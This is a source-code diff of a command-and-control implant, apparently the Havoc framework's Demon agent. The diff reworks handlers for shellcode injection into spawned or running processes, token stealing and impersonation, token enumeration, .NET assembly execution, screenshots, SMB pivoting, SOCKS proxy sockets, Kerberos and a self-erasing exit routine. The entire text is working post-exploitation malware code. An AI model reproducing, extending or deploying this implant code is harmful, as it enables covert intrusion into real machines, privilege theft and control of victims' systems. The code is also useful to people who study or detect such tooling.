+    DWORD     Way     = FALSE;
+    DWORD     Method  = 0;
+    BOOL      x64     = FALSE;
+    PVOID     Payload = NULL;
+    DWORD     Size    = 0;
+    PVOID     Argv    = NULL;
+    DWORD     Argc    = 0;
+    DWORD     Pid     = 0;
+    LPWSTR    Spawn   = NULL;
+    PROC_INFO PcInfo  = { 0 };
 
-    BOOL          Inject         = ( BOOL )  ParserGetInt32( Parser );
-    SHORT         Technique      = ( SHORT ) ParserGetInt32( Parser );
-    SHORT         TargetArch     = ( SHORT ) ParserGetInt32( Parser );
-    PVOID         ShellcodeBytes = ParserGetBytes( Parser, &ShellcodeSize );
-    PVOID         ShellcodeArgs  = ParserGetBytes( Parser, &ArgumentSize );
-    DWORD         TargetPID      = ParserGetInt32( Parser );
+    /* create response package */
+    Package = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
 
-    DWORD         Result         = ERROR_SUCCESS;
-    INJECTION_CTX InjectionCtx   = {
-            .ProcessID      = TargetPID,
-            .hThread        = NULL,
-            .Arch           = TargetArch,
-            .Parameter      = ShellcodeArgs,
-            .ParameterSize  = ArgumentSize,
-    };
+    /* parse arguments */
+    Way     = ParserGetInt32( Parser );
+    Method  = ParserGetInt32( Parser );
+    x64     = ParserGetInt32( Parser );
+    Payload = ParserGetBytes( Parser, &Size );
+    Argv    = ParserGetBytes( Parser, &Argc );
+    Pid     = ParserGetInt32( Parser );
 
-    PRINTF( "Inject[%s] Technique[%d] TargetPID:[%d] TargetProcessArch:[%d] ShellcodeSize:[%d]\n", Inject ? "TRUE" : "FALSE", Technique, TargetPID, TargetArch, ShellcodeSize );
+    PRINTF(
+        "Injection Args:      \n"
+        " - Way     : %d      \n"
+        " - Method  : %d      \n"
+        " - x64     : %s      \n"
+        " - Payload : %p : %d \n"
+        " - Arg     : %p : %d \n"
+        " - Pid     : %d      \n",
+        Way,
+        Method,
+        x64 ? "TRUE" : "FALSE",
+        Payload, Size,
+        Argv, Argc,
+        Pid
+    )
 
-    if ( Inject == 1 )
+    /* dispatch injection way */
+    switch ( Way )
     {
-        // Inject into running process
-        CLIENT_ID         ClientID = { TargetPID, 0 };
-        NTSTATUS          NtStatus = 0;
-        OBJECT_ATTRIBUTES ObjAttr  = { sizeof( ObjAttr ) };
+        case INJECT_WAY_SPAWN: PUTS( "INJECT_WAY_SPAWN" ) {
+            /* use configured target process */
+            if ( x64 ) {
+                Spawn = Instance.Config.Process.Spawn64;
+            } else {
+                Spawn = Instance.Config.Process.Spawn86;
+            }
 
-        NtStatus = Instance.Syscall.NtOpenProcess( &InjectionCtx.hProcess, PROCESS_ALL_ACCESS, &ObjAttr, &ClientID );
+            PRINTF( "Target spawn process: %ls\n", Spawn )
 
-        if ( ! NT_SUCCESS( NtStatus ) )
-        {
-            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-            return;
+            /* create process */
+            if ( ProcessCreate( ( ! x64 ), NULL, Spawn, CREATE_NO_WINDOW | CREATE_NEW_CONSOLE | CREATE_SUSPENDED, &PcInfo, FALSE, NULL ) ) {
+                PRINTF( "ProcessId is %d\n", PcInfo.dwProcessId );
+
+                /* inject code */
+                Status = Inject( Method, PcInfo.hProcess, 0, x64, Payload, Size, 0, Argv, Argc );
+
+                /* terminate process if injection failed */
+                if ( Status != INJECT_ERROR_SUCCESS ) {
+                    ProcessTerminate( PcInfo.hProcess, 0 );
+                }
+
+                /* close process handle */
+                if ( PcInfo.hProcess ) {
+                    SysNtClose( PcInfo.hProcess );
+                }
+
+                /* close thread handle */
+                if ( PcInfo.hThread ) {
+                    SysNtClose( PcInfo.hThread );
+                }
+
+                /* clear struct from stack */
+                RtlSecureZeroMemory( &PcInfo, sizeof( PROC_INFO ) );
+            } else {
+                PRINTF( "Failed to create process: %d\n", NtGetLastError() )
+            }
+
+            break;
+        }
+
+        case INJECT_WAY_INJECT: PUTS( "INJECT_WAY_INJECT" ) {
+            Status = Inject( Method, NULL, Pid, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
+            break;
+        }
+
+        case INJECT_WAY_EXECUTE: PUTS( "INJECT_WAY_EXECUTE" ) {
+            Status = Inject( Method, NtCurrentProcess(), 0, x64, Payload, Size, U_PTR( NULL ),Argv, Argc );
+            break;
+        }
+
+        default: {
+            PRINTF( "Injection way not found: %d\n", Way )
         }
     }
-    else if ( Inject == 2 )
-    {
-        // Execute
-        InjectionCtx.hProcess = NtCurrentProcess();
-    }
 
-    Technique = Technique == 0 ? Instance.Config.Inject.Technique : Technique; // if the teamserver specified 0 ==> means that it should use the technique from the config
 
-    PRINTF( "Technique going to be used => %d\n", Technique )
-
-    Result = ShellcodeInjectDispatch(
-        Inject,
-        Technique,
-        ShellcodeBytes,
-        ShellcodeSize,
-        &InjectionCtx
-    );
-
-    PRINTF( "Injection Result => %d", Result )
-
-    PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageAddInt32( Package, Status );
+    PackageTransmit( Package );
 }
 
 VOID CommandToken( PPARSER Parser )
@@ -1280,28 +1336,42 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_STEAL: PUTS( "Token::Steal" )
         {
-            DWORD  TargetPid    = ParserGetInt32( Parser );
-            HANDLE TargetHandle = ( HANDLE ) ( ULONG_PTR ) ParserGetInt32( Parser );
-            HANDLE StolenToken  = TokenSteal( TargetPid, TargetHandle );
-            UINT32 UserSize     = 0;
-            PCHAR  User         = NULL;
-            DWORD  NewTokenID   = 0;
+            DWORD  TargetPid    = { 0 };
+            HANDLE TargetHandle = { 0 };
+            HANDLE StolenToken  = { 0 };
+            BUFFER UserDomain   = { 0 };
+            DWORD  NewTokenID   = { 0 };
 
-            if ( ! StolenToken )
-            {
+            // TODO: send True or False
+
+            /* parse arguments */
+            TargetPid    = ParserGetInt32( Parser );
+            TargetHandle = C_PTR( ParserGetInt32( Parser ) );
+
+            /* steal token */
+            if ( ! ( StolenToken  = TokenSteal( TargetPid, TargetHandle ) ) ) {
                 PUTS( "[!] Couldn't get remote process token" )
                 return;
             }
 
-            User       = TokenGetUserDomain( StolenToken, &UserSize );
-            NewTokenID = TokenAdd( StolenToken, User, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );
+            if ( ! TokenQueryOwner( StolenToken, &UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) ) {
+                PUTS( "Failed to query user/domain from stolen token" )
+                return;
+            }
 
-            // when a new token is stolen, we impersonate it automatically
-            ImpersonateTokenFromVault( NewTokenID );
+            /* TODO: pass the BUFFER struct to it instead of the PCHAR pointer */
+            NewTokenID = TokenAdd( StolenToken, UserDomain.Buffer, TOKEN_TYPE_STOLEN, TargetPid, NULL, NULL, NULL );
 
-            PRINTF( "[^] New Token added to the Vault: %d User:[%s]\n", NewTokenID, User );
+            /* when a new token is stolen, we impersonate it automatically */
+            if ( ! ImpersonateTokenFromVault( NewTokenID ) )
+            {
+                PUTS( "Failed to impersonate the token" )
+                return;
+            }
 
-            PackageAddString( Package, User );
+            PRINTF( "[^] New Token added to the Vault: %d User:[%ls]\n", NewTokenID, UserDomain.Buffer );
+
+            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
             PackageAddInt32( Package, NewTokenID );
             PackageAddInt32( Package, TargetPid );
 
@@ -1320,7 +1390,7 @@ VOID CommandToken( PPARSER Parser )
 
                     PackageAddInt32( Package, TokenIndex );
                     PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList->Handle );
-                    PackageAddString( Package, TokenList->DomainUser );
+                    PackageAddWString( Package, TokenList->DomainUser );
                     PackageAddInt32( Package, TokenList->dwProcessID );
                     PackageAddInt32( Package, TokenList->Type );
                     PackageAddInt32( Package, Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenList->Handle );
@@ -1400,10 +1470,10 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             CHAR   Deli[ 2 ]      = { '\\', 0 };
             HANDLE hToken         = NULL;
-            PCHAR  UserDomain     = NULL;
-            LPSTR  BufferUser     = NULL;
-            LPSTR  BufferPassword = NULL;
-            LPSTR  BufferDomain   = NULL;
+            PWCHAR UserDomain     = NULL;
+            LPWSTR BufferUser     = NULL;
+            LPWSTR BufferPassword = NULL;
+            LPWSTR BufferDomain   = NULL;
             DWORD  UserDomainSize = dwUserSize + dwDomainSize + 1;
             DWORD  NewTokenID     = 0;
 
@@ -1454,36 +1524,39 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_GET_UID: PUTS( "Token::GetUID" )
         {
-            DWORD           cbSize     = sizeof( TOKEN_ELEVATION );
-            TOKEN_ELEVATION Elevation  = { 0 };
-            HANDLE          hToken     = TokenCurrentHandle( );
-            NTSTATUS        NtStatus   = STATUS_SUCCESS;
-            UINT32          UserSize = 0;
-            PCHAR           User       = NULL;
+            BUFFER User  = { 0 };
+            HANDLE Token = { 0 };
+            BOOL   Admin = FALSE;
 
-            PRINTF( "[x] hToken: 0x%x\n", hToken );
+            /* current handle */
+            if ( ( Token = TokenCurrentHandle() ) ) {
+                /* query if token is elevated and add it to the package */
+                PackageAddInt32( Package, TokenElevated( Token ) );
 
-            if ( ! hToken )
-                return;
-
-            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtQueryInformationToken( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) )
-            {
-                PUTS( "NtQueryInformationToken: Failed" )
-                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-                return;
+                /* query the user of from the current thread/process token */
+                if ( TokenQueryOwner( Token, &User, TOKEN_OWNER_FLAG_DEFAULT ) ) {
+                    PRINTF( "User => %ls [%ld]\n", User.Buffer, User.Length );
+                    PackageAddBytes( Package, User.Buffer, User.Length );
+                } else {
+                    PackageAddBytes( Package, NULL, 0 );
+                    /* TODO: send back error that we couldn't query the user of the token */
+                }
+            } else {
+                /* something went wrong. let's report that */
+                PACKAGE_ERROR_WIN32
             }
-            PUTS( "NtQueryInformationToken: Success" )
 
-            User = TokenGetUserDomain( hToken, &UserSize );
+            /* close handle */
+            if ( Token ) {
+                SysNtClose( Token );
+                Token = NULL;
+            }
 
-            PackageAddInt32( Package, Elevation.TokenIsElevated );
-            PackageAddString( Package, User );
-
-            Instance.Win32.NtClose( hToken );
-
-            if ( User )
-            {
-                DATA_FREE( User, UserSize )
+            /* free queried owner memory */
+            if ( User.Buffer ) {
+                MemZero( User.Buffer, User.Length );
+                NtHeapFree( User.Buffer );
+                User.Buffer = NULL;
             }
 
             break;
@@ -1491,12 +1564,12 @@ VOID CommandToken( PPARSER Parser )
 
         case DEMON_COMMAND_TOKEN_REVERT: PUTS( "Token::Revert" )
         {
-            BOOL Success = Instance.Win32.RevertToSelf();
+            BOOL Success = TokenRevSelf();
 
             PackageAddInt32( Package, Success );
 
             if ( ! Success )
-                CALLBACK_GETLASTERROR;
+                PACKAGE_ERROR_WIN32;
 
             Instance.Tokens.Token       = NULL;
             Instance.Tokens.Impersonate = FALSE;
@@ -1522,9 +1595,9 @@ VOID CommandToken( PPARSER Parser )
             break;
         }
 
-        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::FindTokens" )
+        case DEMON_COMMAND_TOKEN_FIND_TOKENS: PUTS( "Token::Find" )
         {
-            PUniqueUserToken TokenList    = NULL;
+            PUSER_TOKEN_DATA TokenList    = NULL;
             DWORD            NumTokens    = 0;
             BOOL             Success      = FALSE;
             DWORD            NumDelTokens = 0;
@@ -1537,51 +1610,29 @@ VOID CommandToken( PPARSER Parser )
 
             if ( Success )
             {
-                // TODO: this can surely be more efficient
+                PackageAddInt32( Package, NumTokens );
 
                 for (i = 0; i < NumTokens; ++i)
                 {
-                    if ( TokenList[ i ].delegation_available )
-                        NumDelTokens++;
-                    if ( TokenList[ i ].impersonation_available )
-                        NumImpTokens++;
-                }
-
-                PackageAddInt32( Package, NumDelTokens );
-
-                for (i = 0; i < NumTokens; ++i)
-                {
-                    if (TokenList[ i ].delegation_available)
-                    {
-                        PackageAddString( Package, TokenList[ i ].username );
-                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
-                    }
-                }
-
-                PackageAddInt32( Package, NumImpTokens );
-
-                for (i = 0; i < NumTokens; ++i)
-                {
-                    if (TokenList[ i ].impersonation_available)
-                    {
-                        PackageAddString( Package, TokenList[ i ].username );
-                        PackageAddInt32( Package, TokenList[ i ].dwProcessID );
-                        PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
-                    }
+                    PackageAddWString( Package, TokenList[ i ].username );
+                    PackageAddInt32( Package, TokenList[ i ].dwProcessID );
+                    PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) TokenList[ i ].localHandle );
+                    PackageAddInt32( Package, TokenList[ i ].integrity_level );
+                    PackageAddInt32( Package, TokenList[ i ].impersonation_level );
+                    PackageAddInt32( Package, TokenList[ i ].TokenType );
                 }
             }
 
             if ( TokenList )
             {
-                DATA_FREE( TokenList, NumTokens * sizeof( UniqueUserToken ) );
+                DATA_FREE( TokenList, NumTokens * sizeof( USER_TOKEN_DATA ) );
             }
 
             break;
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandAssemblyInlineExecute( PPARSER Parser )
@@ -1655,7 +1706,7 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         {
             PPACKAGE Package = PackageCreate( DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE );
             PackageAddInt32( Package, DOTNET_INFO_FAILED );
-            PackageTransmit( Package, NULL, NULL );
+            PackageTransmit( Package );
 
             DotnetClose();
         }
@@ -1732,7 +1783,7 @@ VOID CommandAssemblyListVersion( PPARSER Parser )
         pRunTimeInfo = NULL;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandConfig( PPARSER Parser )
@@ -1766,20 +1817,22 @@ VOID CommandConfig( PPARSER Parser )
             {
                 PVOID hLib = NULL;
 
-                // TODO: check in the current PEB too
                 hLib = LdrModuleLoad( Library );
                 PRINTF( "hLib => %x\n", hLib );
 
-                if ( hLib )
-                {
+                if ( hLib ) {
                     ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
-                    if ( ThreadAddr )
+                    if ( ThreadAddr ) {
                         Instance.Config.Implant.ThreadStartAddr = ThreadAddr + Offset;
-                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                    }
+                    else {
+                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                    }
 
                     PRINTF( "ThreadAddr => %x\n", ThreadAddr );
+                } else {
+                    PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
                 }
-                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
             }
 
             PackageAddString( Package, Library );
@@ -1863,10 +1916,11 @@ VOID CommandConfig( PPARSER Parser )
                 {
                     ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );
 
-                    if ( ThreadAddr )
+                    if ( ThreadAddr ) {
                         Instance.Config.Inject.SpoofAddr = ThreadAddr + Offset;
-
-                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                    } else {
+                        PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );
+                    }
 
                     PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                 }
@@ -1948,7 +2002,7 @@ VOID CommandConfig( PPARSER Parser )
             break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandScreenshot( PPARSER Parser )
@@ -1957,6 +2011,8 @@ VOID CommandScreenshot( PPARSER Parser )
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
     PVOID    Image   = NULL;
     SIZE_T   Size    = 0;
+
+    // TODO: add error cheking in WinScreenshot and send screenshot in pieces
 
     if ( WinScreenshot( &Image, &Size ) )
     {
@@ -1970,7 +2026,7 @@ VOID CommandScreenshot( PPARSER Parser )
         PackageAddInt32( Package, FALSE );
     }
 
-    PackageTransmit( Package, NULL, 0 );
+    PackageTransmit( Package );
 }
 
 // TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
@@ -1997,21 +2053,26 @@ VOID CommandNet( PPARSER Parser )
                 {
                     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                     {
-                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                        PackageDestroy( Package );
+                       PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                       goto DOMAIN_CLEANUP;
                     }
                 }
+                else
+                    goto DOMAIN_CLEANUP;
             }
+            else
+                goto DOMAIN_CLEANUP;
 
             PackageAddString( Package, Domain );
 
-            if ( Domain )
-            {
-                MemSet( Domain, 0, Length );
-                Instance.Win32.LocalFree( Domain );
-            }
+            DATA_FREE( Domain, Length );
 
             break;
+
+        DOMAIN_CLEANUP:
+            DATA_FREE( Domain, Length );
+            PackageDestroy( Package ); Package = NULL;
+            return;
         }
 
         case DEMON_NET_COMMAND_LOGONS:
@@ -2071,7 +2132,7 @@ VOID CommandNet( PPARSER Parser )
             if ( UserInfo != NULL )
                 Instance.Win32.NetApiBufferFree( UserInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2116,7 +2177,7 @@ VOID CommandNet( PPARSER Parser )
                     goto SESSION_CLEANUP;
                 }
 
-                if ( SessionInfo != NULL )
+                if ( SessionInfo )
                 {
                     Instance.Win32.NetApiBufferFree( SessionInfo );
                     SessionInfo = NULL;
@@ -2130,10 +2191,10 @@ VOID CommandNet( PPARSER Parser )
             break;
 
         SESSION_CLEANUP:
-            if ( SessionInfo != NULL )
+            if ( SessionInfo )
                 Instance.Win32.NetApiBufferFree( SessionInfo );
 
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
             return;
         }
 
@@ -2320,7 +2381,7 @@ VOID CommandNet( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandPivot( PPARSER Parser )
@@ -2380,16 +2441,16 @@ VOID CommandPivot( PPARSER Parser )
 #ifdef DEBUG
                 PPIVOT_DATA TempList = Instance.SmbPivots;
 
-                printf( "Smb Pivots : [ " );
+                PUTS( "Smb Pivots : [ " );
                 do {
                     if ( TempList )
                     {
-                        printf( "%x ", TempList->DemonID );
+                        PRINTF( "%x ", TempList->DemonID );
                         TempList = TempList->Next;
                     } else
                         break;
                 } while ( TRUE );
-                puts( "]" );
+                PUTS( "]" );
 #endif
             }
             else
@@ -2449,7 +2510,7 @@ VOID CommandPivot( PPARSER Parser )
                 if ( ! PipeWrite( PivotData->Handle, &Data ) )
                 {
                     PUTS( "PipeWrite failed" )
-                    CALLBACK_GETLASTERROR
+                    PACKAGE_ERROR_WIN32
                 }
                 else
                     PRINTF( "Successfully wrote 0x%x bytes of data to demon %x\n", Data.Length, DemonId )
@@ -2465,7 +2526,7 @@ VOID CommandPivot( PPARSER Parser )
     }
 
     PUTS( "Pivot transport" )
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandTransfer( PPARSER Parser )
@@ -2588,7 +2649,7 @@ VOID CommandTransfer( PPARSER Parser )
                 PackageAddInt32( Package2, Command );
                 PackageAddInt32( Package2, FileID );
                 PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
-                PackageTransmit( Package2, NULL, NULL );
+                PackageTransmit( Package2 );
                 Package2 = NULL;
             }
 
@@ -2596,7 +2657,7 @@ VOID CommandTransfer( PPARSER Parser )
         }
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandSocket( PPARSER Parser )
@@ -2692,10 +2753,8 @@ VOID CommandSocket( PPARSER Parser )
 
                     /* we don't want to send the message now.
                      * send it while we are free and closing the socket. */
-                    PackageDestroy( Package );
-                    Package = NULL;
-
-                    break;
+                    PackageDestroy( Package ); Package = NULL;
+                    return;
                 }
 
                 Socket = Socket->Next;
@@ -2721,10 +2780,8 @@ VOID CommandSocket( PPARSER Parser )
 
             /* we don't want to send the message now.
              * send it while we are free and closing the sockets. */
-            PackageDestroy( Package );
-            Package = NULL;
-
-            break;
+            PackageDestroy( Package ); Package = NULL;
+            return;
         }
 
         case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
@@ -2734,17 +2791,16 @@ VOID CommandSocket( PPARSER Parser )
             break;
         }
 
-        case SOCKET_COMMAND_READ_WRITE: PUTS( "Socket::Write" )
+        case SOCKET_COMMAND_WRITE: PUTS( "Socket::Write" )
         {
             DWORD  SocketID = 0;
             BUFFER Data     = { 0 };
+            BOOL   Success  = FALSE;
+            DWORD  Type     = SOCKET_TYPE_NONE;
 
             /* Parse arguments */
             SocketID    = ParserGetInt32( Parser );
             Data.Buffer = ParserGetBytes( Parser, &Data.Length );
-
-            PRINTF( "Socket ID: %x\n", SocketID )
-            PRINTF( "Data[%d]: %p\n", Data.Length, Data.Buffer )
 
             /* get Sockets list */
             Socket = Instance.Sockets;
@@ -2752,26 +2808,46 @@ VOID CommandSocket( PPARSER Parser )
             for ( ;; )
             {
                 if ( ! Socket )
+                {
+                    PRINTF( "Could not find socket: %x\n", SocketID )
                     break;
+                }
 
                 if ( Socket->ID == SocketID )
                 {
-                    PRINTF( "Found socket: %x\n", Socket->ID )
+                    Type = Socket->Type;
 
                     /* write the data to the socket */
-                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) == SOCKET_ERROR )
-                        PUTS( "send failed" );
+                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) != SOCKET_ERROR )
+                    {
+                        PRINTF( "Sent 0x%x bytes to Socket %x\n", Data.Length, SocketID )
+                        Success = TRUE;
+                    }
+                    else
+                    {
+                        PRINTF( "Sending 0x%x bytes to Socket %x failed with %d\n", Data.Length, SocketID, Instance.Win32.WSAGetLastError() );
+                    }
 
-                    /* destroy the package and exit this command function */
-                    PackageDestroy( Package );
-
-                    return;
+                    break;
                 }
 
                 Socket = Socket->Next;
             }
 
-            break;
+            if ( Success )
+            {
+                /* destroy the package and exit this command function */
+                PackageDestroy( Package ); Package = NULL;
+                return;
+            }
+            else
+            {
+                /* report the error to the teamserver */
+                PackageAddInt32( Package, SocketID );
+                PackageAddInt32( Package, Type );
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
+            }
         }
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
@@ -2784,6 +2860,7 @@ VOID CommandSocket( PPARSER Parser )
             PBYTE  IPv6       = NULL;
             INT16  Port       = 0;
             LPSTR  Domain     = NULL;
+            UINT32 ErrorCode  = 0;
 
             /* parse arguments */
             ScId   = ParserGetInt32( Parser );
@@ -2814,10 +2891,6 @@ VOID CommandSocket( PPARSER Parser )
                 if ( ! IPv4 )
                 {
                     IPv6 = DnsQueryIPv6( (LPSTR)Domain );
-                    if ( ! IPv6 )
-                    {
-                        PRINTF( "Could not resolve domain: %s\n", Domain );
-                    }
                 }
 
                 Instance.Win32.LocalFree( Domain );
@@ -2836,14 +2909,28 @@ VOID CommandSocket( PPARSER Parser )
             {
                 /* Create a socks proxy socket and insert it into the linked list. */
                 if ( ( Socket = SocketNew( 0, SOCKET_TYPE_REVERSE_PROXY, IPv4, IPv6, Port, 0, 0 ) ) )
+                {
                     Socket->ID = ScId;
+                    ErrorCode = 0;
+                }
+                else
+                {
+                    ErrorCode = NtGetLastError();
+                    PRINTF( "Connect failed with %d\n", ErrorCode )
+                }
 
                 PackageAddInt32( Package, Socket ? TRUE : FALSE );
             }
-            else PackageAddInt32( Package, FALSE );
+            else
+            {
+                PRINTF( "Could not resolve domain: %s\n", Domain );
+                // error code for "Host unreachable"
+                ErrorCode = WSAEHOSTUNREACH;
+                PackageAddInt32( Package, FALSE );
+            }
 
             PackageAddInt32( Package, ScId );
-            PackageAddInt32( Package, NtGetLastError() );
+            PackageAddInt32( Package, ErrorCode );
 
             if ( IPv6 )
             {
@@ -2886,7 +2973,7 @@ VOID CommandSocket( PPARSER Parser )
             }
 
             /* destroy the package and exit this command function */
-            PackageDestroy( Package );
+            PackageDestroy( Package ); Package = NULL;
 
             return;
         }
@@ -2894,11 +2981,12 @@ VOID CommandSocket( PPARSER Parser )
         default: break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
-VOID Commandkerberos( PPARSER Parser )
-{
+VOID CommandKerberos(
+    IN PPARSER Parser
+) {
     PPACKAGE     Package = NULL;
     DWORD        Command = 0;
     HANDLE       hToken  = TokenCurrentHandle();
@@ -2917,7 +3005,7 @@ VOID Commandkerberos( PPARSER Parser )
 
             if ( hToken )
             {
-                Instance.Win32.NtClose( hToken );
+                SysNtClose( hToken );
                 hToken = NULL;
             }
 
@@ -3017,7 +3105,7 @@ VOID Commandkerberos( PPARSER Parser )
 
             if ( hToken )
             {
-                Instance.Win32.NtClose( hToken );
+                SysNtClose( hToken );
                 hToken = NULL;
             }
 
@@ -3053,7 +3141,7 @@ VOID Commandkerberos( PPARSER Parser )
         default: break;
     }
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 VOID CommandMemFile( PPARSER Parser )
@@ -3079,7 +3167,7 @@ VOID CommandMemFile( PPARSER Parser )
     PackageAddInt32( Package, ID );
     PackageAddInt32( Package, MemFile != NULL ? TRUE : FALSE );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
 }
 
 BOOL InWorkingHours( )
@@ -3116,7 +3204,7 @@ BOOL InWorkingHours( )
 
 BOOL ReachedKillDate()
 {
-    return Instance.Config.Transport.KillDate && GetEpochTime() >= Instance.Config.Transport.KillDate;
+    return Instance.Config.Transport.KillDate && GetSystemFileTime() >= Instance.Config.Transport.KillDate;
 }
 
 VOID KillDate( )
@@ -3127,7 +3215,8 @@ VOID KillDate( )
      * "They say time is the fire in which we burn.
      * Right now, Captain, my time is running out." */
     PPACKAGE Package = PackageCreate( DEMON_KILL_DATE );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package );
+    PackageTransmitAll( NULL, NULL );
 
     CommandExit( NULL );
 }
@@ -3163,7 +3252,8 @@ VOID CommandExit( PPARSER Parser )
         ExitMethod = ParserGetInt32( Parser );
 
         PackageAddInt32( Package, ExitMethod );
-        PackageTransmit( Package, NULL, NULL );
+        PackageTransmit( Package );
+        PackageTransmitAll( NULL, NULL );
     }
 
     // kill all running jobs
@@ -3200,8 +3290,9 @@ VOID CommandExit( PPARSER Parser )
     // remove downloads
     for ( ;; )
     {
-        if ( ! DownloadList )
+        if ( ! DownloadList ) {
             break;
+        }
 
         DownloadEntry = DownloadList;
         DownloadList = DownloadList->Next;
@@ -3209,11 +3300,11 @@ VOID CommandExit( PPARSER Parser )
         DownloadRemove( DownloadEntry->FileID );
     }
 
-    // remove memfiles
     for ( ;; )
     {
-        if ( ! MemFileList )
+        if ( ! MemFileList ) {
             break;
+        }
 
         MemFileEntry = MemFileList;
         MemFileList = MemFileList->Next;
@@ -3229,11 +3320,16 @@ VOID CommandExit( PPARSER Parser )
         Instance.DownloadChunk.Length = 0;
     }
 
+#ifdef TRANSPORT_HTTP
+    DATA_FREE( Instance.ProxyForUrl, Instance.SizeOfProxyForUrl );
+#endif
+
     // disconnect from all smb pivots
     for ( ;; )
     {
-        if ( ! SmbPivotList )
+        if ( ! SmbPivotList ) {
             break;
+        }
 
         SmbPivotEntry = SmbPivotList;
         SmbPivotList = SmbPivotList->Next;
@@ -3248,8 +3344,18 @@ VOID CommandExit( PPARSER Parser )
     TokenClear();
 
     // terminate the use of the Winsock 2 DLL (Ws2_32.dll)
-    if ( Instance.WSAWasInitialised )
+    if ( Instance.WSAWasInitialised ) {
         Instance.Win32.WSACleanup();
+    }
+
+#if TRANSPORT_HTTP
+    // close the HTTP session
+    if ( Instance.hHttpSession ) {
+        Instance.Win32.WinHttpCloseHandle( Instance.hHttpSession );
+    }
+#endif
+
+#if _WIN64
 
     /* NOTE:
      *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
@@ -3257,13 +3363,13 @@ VOID CommandExit( PPARSER Parser )
      *      Clear memory by using a gadgets that prepares and executes movsb
      */
 
-    ImageBase = C_PTR( Instance.Session.ModuleBase );
-    ImageSize = IMAGE_SIZE( ImageBase );
+    ImageBase = Instance.Session.ModuleBase;
+    ImageSize = NULL;
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance.Win32.RtlCaptureContext( &RopExit );
 
-    RopExit.Rip = U_PTR( Instance.Syscall.NtFreeVirtualMemory );
+    RopExit.Rip = U_PTR( Instance.Win32.NtFreeVirtualMemory );
     RopExit.Rsp = U_PTR( ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
     RopExit.Rcx = U_PTR( NtCurrentProcess() );
     RopExit.Rdx = U_PTR( &ImageBase );
@@ -3277,5 +3383,17 @@ VOID CommandExit( PPARSER Parser )
